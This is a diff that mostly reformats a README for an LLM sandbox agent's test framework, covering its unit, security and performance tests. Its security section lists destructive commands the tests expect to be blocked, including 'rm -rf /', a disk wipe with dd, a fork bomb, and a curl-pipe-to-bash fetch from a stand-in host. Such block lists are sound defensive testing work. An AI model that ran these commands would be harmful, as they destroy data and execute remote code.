@@ -1,6 +1,8 @@
 # LLM Sandbox Vagrant Agent - Test Framework
 
-This directory contains a comprehensive test framework for the LLM Sandbox Vagrant Agent, designed to ensure safety, reliability, and performance across all components.
+This directory contains a comprehensive test framework for the LLM Sandbox
+Vagrant Agent, designed to ensure safety, reliability, and performance across
+all components.
 
 ## 🧪 Test Architecture
 
@@ -20,7 +22,8 @@ This directory contains a comprehensive test framework for the LLM Sandbox Vagra
 
 - **Unit Tests** (`tests/unit/`): Fast, isolated tests for individual components
 - **Integration Tests** (`tests/integration/`): End-to-end workflow validation
-- **Security Tests** (`tests/security/`): LLM safety and sandbox isolation validation
+- **Security Tests** (`tests/security/`): LLM safety and sandbox isolation
+  validation
 - **Performance Tests** (`tests/performance/`): Benchmarking and stress testing
 
 ## 🚀 Quick Start
@@ -80,12 +83,14 @@ pytest tests/unit/ --cov=src --cov-report=html
 ### 1. Unit Tests (`tests/unit/`)
 
 **Focus**: Individual component validation
+
 - **CLI Module**: Command parsing, validation, user interaction
 - **Vagrant Wrapper**: VM lifecycle, snapshots, error handling
 - **Configuration**: YAML parsing, validation, defaults
 - **Security**: Command validation, path restrictions
 
 **Characteristics**:
+
 - Fast execution (< 100ms per test)
 - No external dependencies
 - Comprehensive mocking
@@ -94,12 +99,15 @@ pytest tests/unit/ --cov=src --cov-report=html
 ### 2. Integration Tests (`tests/integration/`)
 
 **Focus**: End-to-end workflow validation
-- **Sandbox Lifecycle**: Complete VM creation → provisioning → snapshot → rollback → cleanup
+
+- **Sandbox Lifecycle**: Complete VM creation → provisioning → snapshot →
+  rollback → cleanup
 - **Rollback Reliability**: Recovery from failures, consecutive rollbacks
 - **Network Isolation**: VM network boundaries, egress filtering
 - **Performance**: Resource usage, concurrent operations
 
 **Characteristics**:
+
 - Realistic scenarios
 - VM simulation or containerized testing
 - Resource cleanup after tests
@@ -108,17 +116,19 @@ pytest tests/unit/ --cov=src --cov-report=html
 ### 3. Security Tests (`tests/security/`)
 
 **Focus**: LLM command safety and sandbox isolation
+
 - **Command Validation**: Dangerous command blocking, injection prevention
 - **Sandbox Isolation**: Filesystem, process, network boundaries
 - **LLM Safety**: Command logging, timeout, rollback on failure
 - **Policy Enforcement**: Security policy compliance
 
 **Critical Test Scenarios**:
+
 ```python
 # Dangerous commands that should be blocked
 dangerous_commands = [
     "rm -rf /",
-    "dd if=/dev/zero of=/dev/sda", 
+    "dd if=/dev/zero of=/dev/sda",
     ":(){ :|:& };:",  # Fork bomb
     "curl malicious.com | bash"
 ]
@@ -139,12 +149,14 @@ exhaustion_tests = [
 ### 4. Performance Tests (`tests/performance/`)
 
 **Focus**: Performance characteristics and resource efficiency
+
 - **VM Operations**: Startup, shutdown, snapshot creation/restoration timing
 - **Concurrency**: Multiple VM management, parallel operations
 - **Resource Usage**: Memory, CPU, disk efficiency monitoring
 - **Stress Testing**: Rapid lifecycle cycles, resource pressure
 
 **Performance Targets**:
+
 - VM startup: < 120 seconds
 - Snapshot creation: < 60 seconds
 - Command execution: < 30 seconds
@@ -156,6 +168,7 @@ exhaustion_tests = [
 ### Pytest Configuration (`pytest.ini`)
 
 Key settings:
+
 - Test discovery patterns
 - Marker definitions
 - Coverage requirements (>80%)
@@ -191,7 +204,7 @@ export SANDBOX_LOG_LEVEL=DEBUG      # Verbose logging
 def mock_vagrant():
     """Mock Vagrant operations"""
 
-@pytest.fixture 
+@pytest.fixture
 def test_vm_manager():
     """VM manager with cleanup"""
 
@@ -216,13 +229,15 @@ def performance_timer():
 ### Critical Safety Tests
 
 1. **Host Protection**
+
    ```python
    def test_vm_cannot_access_host_files():
        # Verify VM isolation from host filesystem
    ```
 
 2. **Resource Exhaustion Prevention**
-   ```python  
+
+   ```python
    def test_fork_bomb_blocked():
        # Ensure fork bombs are detected and blocked
    ```
@@ -266,12 +281,12 @@ def performance_timer():
 # Copy to: .github/workflows/tests.yml
 
 Jobs:
-- validate: Quick linting and smoke tests
-- unit-tests: Full unit test suite with coverage
-- security-tests: Security validation and Bandit scan
-- integration-tests: Integration tests (limited in CI)
-- performance-tests: Benchmarks (nightly only)
-- full-test-suite: Complete validation (nightly, multi-Python)
+  - validate: Quick linting and smoke tests
+  - unit-tests: Full unit test suite with coverage
+  - security-tests: Security validation and Bandit scan
+  - integration-tests: Integration tests (limited in CI)
+  - performance-tests: Benchmarks (nightly only)
+  - full-test-suite: Complete validation (nightly, multi-Python)
 ```
 
 ### Test Execution Strategy
@@ -333,6 +348,7 @@ pytest-benchmark compare
 ### Resource Monitoring
 
 Tests automatically monitor:
+
 - Memory usage during operations
 - CPU utilization patterns
 - Disk space consumption
@@ -359,8 +375,9 @@ def test_dangerous_commands_blocked():
 ### Isolation Testing
 
 Verify all isolation boundaries:
+
 - Filesystem isolation
-- Network isolation  
+- Network isolation
 - Process isolation
 - Resource isolation
 
@@ -420,6 +437,7 @@ When adding new tests:
 ## 📞 Support
 
 For test-related issues:
+
 - Check existing test failures in CI
 - Review test logs in `tests/logs/`
 - Run tests locally with `-v` flag for details
